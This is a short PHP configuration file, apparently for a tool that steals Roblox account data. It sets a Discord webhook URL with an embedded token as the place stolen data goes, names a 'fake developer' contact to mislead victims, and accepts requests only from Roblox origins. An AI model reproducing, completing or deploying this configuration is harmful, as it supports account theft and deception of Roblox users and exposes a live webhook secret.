<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/910887830320988161/tdxOKaEBA98SlyuEYhAuKSdKzegjJ5W4gODBNWsqX06M0I70k99w9tAdJaF13w9uGkXB";
    // fake developer for the bot the users may contact
    $discord_contact = "TeeScrap#1474";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
